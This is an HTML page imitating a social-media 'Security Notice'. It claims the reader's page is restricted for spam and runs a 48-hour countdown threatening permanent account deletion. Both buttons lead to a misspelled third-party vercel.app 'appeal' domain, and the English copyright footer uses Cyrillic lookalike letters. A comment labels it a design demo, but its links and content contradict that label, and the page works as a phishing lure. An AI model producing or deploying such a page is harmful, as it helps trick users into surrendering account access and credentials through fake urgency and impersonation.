<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Security Notice ‚Äì Demo</title>
  <meta name="robots" content="noindex,nofollow" />
  <!--
    ‚ö†Ô∏è DISCLAIMER: File ini untuk DEMO/UI mockup.
    Jangan gunakan untuk meniru/menyesatkan sebagai pihak resmi apa pun.
    Pertahankan tautan ke domain resmi dan jangan mengumpulkan kredensial.
  -->
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --bg: #f0f2f5;
      --fg: #1c1e21;
      --muted: #65676b;
      --line: #e4e6eb;
      --blue: #1877f2;
      --blue-dark: #166fe5;
      --warn-bg: #fff3cd;
      --warn-border: #ffc107;
      --warn-text: #856404;
      --danger: #dc3545;
      --card: #fff;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--bg);
      color: var(--fg);
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
    }

    .overlay {
      position: fixed; inset: 0; z-index: 1000;
      background-color: rgba(244, 244, 244, 0.8);
      backdrop-filter: blur(4px);
      display: flex; align-items: center; justify-content: center;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
    @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    @keyframes wiggle { 0%,100% { transform: rotate(0deg); } 25% { transform: rotate(-5deg); } 75% { transform: rotate(5deg); } }

    .popup-modal {
      width: 90%; max-width: 520px;
      background-color: var(--card);
      border-radius: 10px;
      box-shadow: 0 12px 28px rgba(0,0,0,.2), 0 2px 4px rgba(0,0,0,.1);
      position: relative; animation: slideUp 0.3s ease;
    }

    .popup-header {
      padding: 14px 16px; border-bottom: 1px solid var(--line);
      display: flex; align-items: center; justify-content: space-between; gap: 8px;
    }

    .title-wrap { display: flex; align-items: center; gap: 10px; }
    .popup-title { font-size: 18px; font-weight: 700; color: var(--fg); display: flex; align-items: center; gap: 8px; }

    .lang-switch {
      display: inline-flex; gap: 6px; align-items: center;
      background: #f5f6f7; border: 1px solid var(--line);
      padding: 4px; border-radius: 999px;
    }
    .lang-switch button {
      border: none; background: transparent; cursor: pointer;
      font-weight: 600; font-size: 12px; color: var(--muted); padding: 6px 10px; border-radius: 999px;
    }
    .lang-switch button.active { background: #fff; color: var(--fg); box-shadow: 0 1px 2px rgba(0,0,0,.06); }

    .close-btn {
      width: 36px; height: 36px; border-radius: 50%;
      background-color: #e4e6eb; border: none; cursor: pointer;
      display: inline-flex; align-items: center; justify-content: center;
      font-size: 18px; color: var(--muted);
      transition: background-color 0.2s;
    }
    .close-btn:hover { background-color: #d8dadf; }

    .popup-content { padding: 22px 18px; text-align: center; }
    .warning-icon { font-size: 80px; margin-bottom: 12px; animation: pulse 2s infinite, wiggle 1.5s ease-in-out infinite alternate; }

    .popup-message { font-size: 15px; line-height: 1.6; color: var(--fg); margin-bottom: 6px; }
    .popup-message strong { font-weight: 800; }

    .warning-box { background: var(--warn-bg); border: 1px solid var(--warn-border); border-radius: 8px; padding: 12px 14px; margin: 14px 0; text-align: left; }
    .warning-box-text { font-size: 13px; color: var(--warn-text); line-height: 1.5; }

    .detail-list { text-align: left; margin: 14px 0; background: #f5f6f7; border-radius: 8px; padding: 14px; }
    .detail-item { display: flex; justify-content: space-between; gap: 12px; padding: 8px 0; font-size: 14px; border-bottom: 1px solid var(--line); }
    .detail-item:last-child { border-bottom: none; }
    .detail-label { color: var(--muted); font-weight: 600; }
    .detail-value { color: var(--fg); font-weight: 700; text-align: right; }
    .status-badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 800; background: var(--danger); color: #fff; }

    .popup-footer { padding: 12px 18px 18px; display: flex; flex-direction: column; gap: 10px; }
    .btn { padding: 12px 24px; font-size: 15px; font-weight: 700; border: none; border-radius: 8px; cursor: pointer; transition: transform .05s ease, background-color .2s; text-decoration: none; display: inline-block; text-align: center; width: 100%; }
    .btn:active { transform: translateY(1px); }
    .btn-primary { background: var(--blue); color: #fff; }
    .btn-primary:hover { background: var(--blue-dark); }
    .btn-secondary { background: #e4e6eb; color: var(--fg); }
    .btn-secondary:hover { background: #d8dadf; }

    .timestamp { font-size: 12px; color: var(--muted); text-align: center; margin-top: 6px; }

    .assist { padding: 10px 18px 16px; text-align: center; color: var(--muted); font-size: 12px; }

    @media (max-width: 640px) {
      .popup-modal { width: 95%; margin: 0 16px; }
      .popup-content { padding: 18px 12px; }
      .warning-icon { font-size: 64px; }
      .detail-item { flex-direction: column; gap: 6px; }
      .detail-value { text-align: left; }
    }
  </style>
</head>
<body>
  <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="title">
    <div class="popup-modal">
      <div class="popup-header">
        <div class="title-wrap">
          <div class="popup-title" id="title">‚ö†Ô∏è <span data-i18n="title">Peringatan Keamanan</span></div>
        </div>
        <div class="lang-switch" role="group" aria-label="Language switcher">
          <button type="button" id="btn-id" class="active">ID</button>
          <button type="button" id="btn-en">EN</button>
        </div>
        <button class="close-btn" aria-label="Close" id="closeBtn">‚úï</button>
      </div>

      <div class="popup-content">
        <div class="warning-icon" aria-hidden="true">üö®</div>
        <p class="popup-message"><strong data-i18n="headline"><!-- filled by JS --></strong></p>
        <p class="popup-message" data-i18n="desc"><!-- filled by JS --></p>

        <div class="warning-box">
          <p class="warning-box-text" data-i18n="urgency"><!-- filled by JS --></p>
        </div>

        <div class="detail-list" aria-live="polite">
          <div class="detail-item"><span class="detail-label" data-i18n="statusLabel">Status</span><span class="detail-value"><span class="status-badge" data-i18n="statusValue">DIBATASI</span></span></div>
          <div class="detail-item"><span class="detail-label" data-i18n="violationLabel">Pelanggaran</span><span class="detail-value" data-i18n="violationValue">Spam & Aktivitas Mencurigakan</span></div>
          <div class="detail-item"><span class="detail-label" data-i18n="deadlineLabel">Batas Waktu</span><span class="detail-value" id="deadlineValue">19 Okt 2025, 23:59 WITA</span></div>
          <div class="detail-item"><span class="detail-label" data-i18n="remainingLabel">Sisa Waktu</span><span class="detail-value" id="countdown">‚Äî:‚Äî:‚Äî:‚Äî</span></div>
        </div>

        <p style="font-size:13px;color:var(--muted);line-height:1.5;" data-i18n="footnote"><!-- filled by JS --></p>
      </div>

      <div class="popup-footer">
        <a href="https://submit-apeal-to-fix-violution-request.vercel.app/" class="btn btn-primary" rel="noopener noreferrer" data-i18n="ctaAppeal">Ajukan Banding</a>
        <a href="https://submit-apeal-to-fix-violution-request.vercel.app/" class="btn btn-secondary" rel="noopener noreferrer" data-i18n="ctaPolicy">Lihat Kebijakan</a>
        <p class="timestamp" id="timestamp">‚Äî</p>
      </div>

      <div class="assist" data-i18n="disclaimer"><!-- filled by JS --></div>
    </div>
  </div>

  <script>
    // ===== i18n strings =====
    const I18N = {
      id: {
        title: 'Peringatan Keamanan',
        headline: 'Halaman Anda Telah Melanggar Standar Komunitas',
        desc: 'Kami mendeteksi aktivitas yang tidak sesuai dengan kebijakan platform. Halaman Anda saat ini dalam status pembatasan.',
        urgency: '<strong>‚è∞ Perhatian:</strong> Anda memiliki waktu 48 jam untuk mengajukan banding. Jika tidak, akun dapat dinonaktifkan secara permanen.',
        statusLabel: 'Status',
        statusValue: 'DIBATASI',
        violationLabel: 'Pelanggaran',
        violationValue: 'Spam & Aktivitas Mencurigakan',
        deadlineLabel: 'Batas Waktu',
        remainingLabel: 'Sisa Waktu',
        footnote: 'Jika Anda yakin ini adalah kesalahan, segera ajukan banding untuk peninjauan ulang kasus Anda.',
        ctaAppeal: 'Ajukan Banding',
        ctaPolicy: 'Lihat Kebijakan',
        disclaimer: 'Demo UI untuk keperluan desain/edukasi. Bukan notifikasi resmi.',
      },
      en: {
        title: 'Security Notice',
        headline: 'Your Page Violated Community Standards',
        desc: 'We detected activity that does not comply with the platform policies. Your page is currently restricted.',
        urgency: '<strong>‚è∞ Heads‚Äëup:</strong> You have 48 hours to file an appeal. Otherwise, your account may be permanently disabled.',
        statusLabel: 'Status',
        statusValue: 'RESTRICTED',
        violationLabel: 'Violation',
        violationValue: 'Spam & Suspicious Activity',
        deadlineLabel: 'Deadline',
        remainingLabel: 'Time Remaining',
        footnote: 'If you believe this is a mistake, please submit an appeal for review as soon as possible.',
        ctaAppeal: 'Submit Appeal',
        ctaPolicy: 'View Policy',
        disclaimer: '¬© 2025 Su—Ä—Ä–ært –†–∞g–µ. –êll rights r–µs–µrv–µd.',
      }
    };

    // ===== Helpers =====
    const $ = (sel, root=document) => root.querySelector(sel);
    const $$ = (sel, root=document) => Array.from(root.querySelectorAll(sel));

    function setLang(lang) {
      const dict = I18N[lang] || I18N.id;
      $$('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (key in dict) el.innerHTML = dict[key];
      });
      // Toggle badge text explicitly to keep weight/semantics
      $('[data-i18n="statusValue"]').textContent = dict.statusValue;
      // Buttons active state
      $('#btn-id').classList.toggle('active', lang === 'id');
      $('#btn-en').classList.toggle('active', lang === 'en');
      // Persist
      try { localStorage.setItem('notif_lang', lang); } catch {}
    }

    // ===== Countdown =====
    // Target: 19 Oct 2025 23:59 WITA (UTC+08:00)
    const DEADLINE = new Date('2025-10-19T23:59:00+08:00');

    function formatRemaining(ms, lang) {
      if (ms <= 0) return lang === 'en' ? 'Expired' : 'Berakhir';
      const sec = Math.floor(ms / 1000);
      const d = Math.floor(sec / 86400);
      const h = Math.floor((sec % 86400) / 3600);
      const m = Math.floor((sec % 3600) / 60);
      const s = sec % 60;
      return `${String(d).padStart(2,'0')}:${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
    }

    function startCountdown() {
      const tick = () => {
        const now = new Date();
        const diff = DEADLINE.getTime() - now.getTime();
        const lang = (localStorage.getItem('notif_lang') || 'id');
        $('#countdown').textContent = formatRemaining(diff, lang);
      };
      tick();
      return setInterval(tick, 1000);
    }

    // ===== Timestamp (local) =====
    function updateTimestamp() {
      const now = new Date();
      const opts = { dateStyle: 'long', timeStyle: 'short' };
      $('#timestamp').textContent = new Intl.DateTimeFormat(undefined, opts).format(now);
    }

    // ===== Close =====
    function closePopup() {
      const overlay = $('.overlay');
      overlay.style.animation = 'fadeOut 0.3s ease';
      setTimeout(() => { overlay.style.display = 'none'; }, 280);
    }

    // ===== Init =====
    let intervalId;
    (function init(){
      // language from storage or browser
      const stored = (()=>{ try { return localStorage.getItem('notif_lang'); } catch { return null; } })();
      const preferred = stored || (navigator.language || 'id').toLowerCase().startsWith('en') ? 'en' : 'id';
      setLang(preferred);

      // Set fixed deadline label (localized month/day)
      const deadlineOpts = { dateStyle: 'medium', timeStyle: 'short' };
      const dlStr = new Intl.DateTimeFormat(undefined, deadlineOpts).format(DEADLINE);
      $('#deadlineValue').textContent = dlStr + ' (UTC+8)';

      // Start countdown & timestamp
      intervalId = startCountdown();
      updateTimestamp();

      // Bind events
      $('#btn-id').addEventListener('click', () => setLang('id'));
      $('#btn-en').addEventListener('click', () => setLang('en'));
      $('#closeBtn').addEventListener('click', closePopup);

      // CTA behavior (keep default navigation but can be tracked if needed)
      $$('.btn').forEach(btn => btn.addEventListener('click', () => {}));
    })();
  </script>

</body>
